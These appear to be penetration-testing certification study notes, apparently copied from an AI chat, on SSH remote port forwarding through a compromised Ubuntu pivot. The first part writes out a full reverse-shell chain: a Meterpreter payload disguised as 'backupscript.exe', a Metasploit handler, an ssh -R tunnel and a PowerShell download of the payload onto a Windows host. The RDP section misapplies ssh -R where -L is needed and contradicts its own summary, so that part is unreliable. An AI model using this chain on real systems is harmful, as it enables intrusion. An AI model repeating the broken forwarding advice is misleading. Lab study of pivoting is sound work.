🔄 Remote Port Forwarding (SSH -R) — CPTS Breakdown
This is the opposite of what we did in dynamic SOCKS proxying. Now, we’re forwarding from the target’s network back to us.

🧠 Scenario Recap
You compromised an Ubuntu pivot box that:

Has access to a Windows target on a private internal network 172.16.5.x.

That Windows box can’t reach your attacker machine directly (no route to 10.10.x.x or 10.129.x.x).

You want a reverse shell from the Windows box → to your attack box (not just RDP or remote desktop).

But:

❌ The Windows target can’t reach your box directly. ✅ The Ubuntu pivot can reach both: your attack box and the Windows target.

🛠️ What You Do
🔹 Step 1: Create a Payload
bash
Copy
Edit
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe -o backupscript.exe
This makes the payload connect back to the Ubuntu pivot (not you directly).

🔹 Step 2: Start Your Metasploit Handler
bash
Copy
Edit
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 8000
run
You're listening on port 8000 locally, ready for the final forwarded connection.

🔹 Step 3: Forward the Remote Port Back to You
From your attack box, run:

bash
Copy
Edit
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@<Pivot-IP> -vN
That command:

Listens on Ubuntu pivot: 172.16.5.129:8080

Forwards to you: 0.0.0.0:8000 (your Metasploit listener)

Makes it so anything connecting to Ubuntu on 8080 (like Windows payload)... gets tunneled to your Metasploit listener.

🔹 Step 4: Deliver the Payload
Either:

Use PowerShell:

powershell
Copy
Edit
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
Or open it in a browser on the Windows host.

🔹 Step 5: Execute Payload & Profit
Payload connects to Ubuntu (on 8080).

SSH forwards that to your box (on 8000).

You catch the Meterpreter shell.

Your listener will show:

scss
Copy
Edit
[*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1)
(127.0.0.1 is shown because you’re receiving it over a local SSH socket, not directly from the Windows target.)

📌 Difference vs Dynamic Port Forwarding (SOCKS)
🔄 Type	Description
Dynamic (SOCKS) -D	You scan or access outbound through the pivot — like Nmap or RDP’ing to internal hosts.
Remote Forward -R	You make a service (like reverse shell) that comes inbound from the victim, travel through the pivot back to you.
Local Forward -L	You access an internal service on the pivot from your local box.
TL;DR:
-L: Pull internal services to you (e.g., MySQL).

-D: Browse/scan from inside the internal network.

-R: Catch reverse shells when the victim can’t see your box.

🧠 When to Use This in CPTS
This 100% belongs in the "pivoted access" section of your report. Even if the flag is captured via RDP, if you used -R to catch a Meterpreter shell, document it as a technique leveraged for deeper access or tool execution.

Bonus points if you:

Chain multiple techniques together.

Explain why you had to pivot this way (e.g., no route from victim to attacker).


This is the exact scenario for using Remote Port Forwarding (-R) when you want to "pull" access from inside to you — like pivoting RDP access, a reverse shell, or any restricted internal service.

🔁 Let’s walk through your exact example:
Scenario:
You found RDP open on 172.16.8.20.

You're on your attack box (10.10.x.x).

There's no direct route from you → 172.16.8.20.

But you've got an intermediate Ubuntu box (pivot) at 172.16.8.5 you can SSH into.

✅ What you do:
🔹 Step 1: Remote Forward RDP to Yourself
bash
Copy
Edit
ssh -R 172.16.8.5:3389:172.16.8.20:3389 ubuntu@172.16.8.5 -vN
This tells the Ubuntu box to listen on 172.16.8.5:3389.

And forward all incoming RDP traffic to 172.16.8.20:3389 (Windows host).

You now have an RDP bridge via the pivot.

🔹 Step 2: Connect to RDP through that bridge
bash
Copy
Edit
xfreerdp /v:172.16.8.5 /u:victor /p:pass@123
BAM 💥 — You’re inside 172.16.8.20 without ever directly touching it.

🔍 What’s Really Happening?
You can’t reach 172.16.8.20 directly.

But 172.16.8.5 (your pivot) can.

So you make 172.16.8.5 act like a proxy for that port, and access that instead.

🧠 Bonus Tip:
Want to be extra slick? Use an alternate port so you don’t mess with real services:

bash
Copy
Edit
ssh -R 172.16.8.5:4444:172.16.8.20:3389 ubuntu@172.16.8.5 -vN
xfreerdp /v:172.16.8.5:4444 /u:victor /p:pass@123
✅ TL;DR:
This is not dynamic port forwarding (SOCKS).

This is you pulling internal access back through the pivot to your box.

Works great for RDP, reverse shells, or any TCP service.
